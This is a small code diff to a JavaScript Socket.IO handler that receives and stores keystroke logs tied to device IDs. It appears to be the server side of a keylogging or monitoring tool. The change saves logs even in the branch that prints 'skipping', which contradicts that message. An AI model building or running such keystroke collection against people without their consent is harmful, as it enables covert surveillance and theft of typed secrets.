@@ -603,10 +603,10 @@ export const startSocketIO = async () => {
 							);
 
 							// Data should be include deviceId and keylogs
-							const res = await addNewKeyLogs(response);
 						} else {
 							console.log("Empty key logs, skipping...");
 						}
+						await addNewKeyLogs(response);
 					} catch (error) {
 						console.log("Key Logs Response Error", error);
 					}
